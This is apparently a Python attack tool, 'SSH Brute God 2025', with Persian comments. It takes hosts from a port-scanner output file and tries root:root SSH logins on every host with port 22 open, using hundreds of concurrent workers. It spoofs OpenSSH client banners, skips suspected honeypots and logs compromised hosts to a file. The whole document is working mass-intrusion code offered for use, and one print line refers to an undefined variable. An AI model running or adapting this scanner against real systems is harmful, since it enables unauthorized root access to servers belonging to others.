#!/usr/bin/env python3
import asyncio
import aiofiles
import sys
import argparse
import os
import time
import psutil
import paramiko
import socket
import random
from datetime import datetime, timedelta

print("""
╔═══════════════════════════════════════════════════════════╗
║     SSH Brute God 2025 – REAL ROOT:ROOT BRUTE (FAST)     ║
║             توسط بهترین هکر دنیا 2025                     ║
║            Accurate Auth – High Speed – Anti-Honeypot     ║
╚═══════════════════════════════════════════════════════════╝
""")

parser = argparse.ArgumentParser()
parser.add_argument("input_file", help="Input TXT from scanner")
parser.add_argument("-t", "--threads", type=int, default=800, help="Threads (recommend 600-1000)")
parser.add_argument("-d", "--debug", action="store_true")
args = parser.parse_args()

MAX_WORKERS = args.threads
DEBUG = args.debug

results_file = f"ssh_root_success_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

stats = {"total": 0, "scanned": 0, "success": 0, "start_time": time.time()}
lock = asyncio.Lock()
cpu_proc = psutil.Process(os.getpid())

USERNAME = "root"
PASSWORD = "root"

# =============== IP GENERATOR ===============
async def ip_generator(file_path):
    async with aiofiles.open(file_path, 'r') as f:
        async for line in f:
            line = line.strip()
            if line.startswith('[OPEN]'):
                try:
                    parts = line.split(' ', 1)[1]
                    ip_port = parts.split(' | ')[0] if ' | ' in parts else parts
                    ip, port = ip_port.split(':')
                    if int(port) == 22:
                        yield ip.strip(), 22
                        async with lock:
                            stats["total"] += 1
                except:
                    pass

# =============== REAL BRUTE WITH PARAMIKO (Optimized) ===============
async def brute_ip(ip, port, sem):
    async with sem:
        reason = "Unknown"
        transport = None
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(6)
            await asyncio.get_event_loop().sock_connect(sock, (ip, port))

            transport = paramiko.Transport(sock)
            transport.local_version = random.choice([
                "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
                "SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3",
            ])
            transport.start_client(timeout=4)

            # چک honeypot با بنر
            if not transport.remote_version or "SSH" not in transport.remote_version:
                reason = "Honeypot (Invalid banner)"
                return

            # تست واقعی پسورد
            transport.auth_password(username=USERNAME, password=PASSWORD)
            if transport.is_authenticated():
                line = f"[SUCCESS] {ip}:{port} | {USERNAME}:{PASSWORD}"
                print(f"\n\033[91m{SUCCESS}\033[0m")
                await save_line(results_file, line)
                async with lock:
                    stats["success"] += 1
                if DEBUG: print(f"[DEBUG] {ip}:{port} - SUCCESS! root:root درست بود!")
                return

            reason = "Auth failed (wrong password or root disabled)"

        except paramiko.SSHException as e:
            if "banner" in str(e).lower() or "reset" in str(e).lower():
                reason = "Honeypot/Reset"
            else:
                reason = f"SSH Error ({str(e)[:30]})"
        except socket.timeout:
            reason = "Timeout"
        except ConnectionRefusedError:
            reason = "Refused"
        except ConnectionResetError:
            reason = "Reset by peer (Honeypot?)"
        except Exception as e:
            reason = f"Error ({str(e)[:30]})"
        finally:
            if transport:
                try: transport.close()
                except: pass
            if sock:
                try: sock.close()
                except: pass

            if DEBUG: print(f"[DEBUG] {ip}:{port} - FAIL: {reason}")

        async with lock:
            stats["scanned"] += 1

# =============== SAVE & STATS ===============
async def save_line(file, line):
    async with aiofiles.open(file, "a") as f:
        await f.write(line + "\n")

async def periodic_stats():
    while True:
        await asyncio.sleep(1)
        async with lock:
            elapsed = time.time() - stats["start_time"]
            speed = stats["scanned"] / elapsed if elapsed > 0 else 0
            eta = (stats["total"] - stats["scanned"]) / speed if speed > 0 else 999999
            cpu = cpu_proc.cpu_percent()
            print(f"[STATUS {datetime.now().strftime('%H:%M:%S')}] Scanned: {stats['scanned']:,}/{stats['total']:,} | Success: {stats['success']:,} | Speed: {speed:,.0f}/s | CPU: {cpu:.1f}% | ETA: {str(timedelta(seconds=int(eta)))}")

# =============== MAIN ===============
async def main():
    print(f"[+] Loading: {args.input_file}")
    print(f"[+] Threads: {MAX_WORKERS}")
    print(f"[+] Testing root:root – 100% Accurate\n")

    sem = asyncio.Semaphore(MAX_WORKERS)
    asyncio.create_task(periodic_stats())

    tasks = []
    async for ip_port in ip_generator(args.input_file):
        tasks.append(brute_ip(*ip_port, sem))
        if len(tasks) >= MAX_WORKERS * 5:
            await asyncio.gather(*tasks)
            tasks = []

    if tasks:
        await asyncio.gather(*tasks)

    print(f"\n\n[+] Finished! Successes → {results_file}")

if __name__ == "__main__":
    asyncio.run(main())
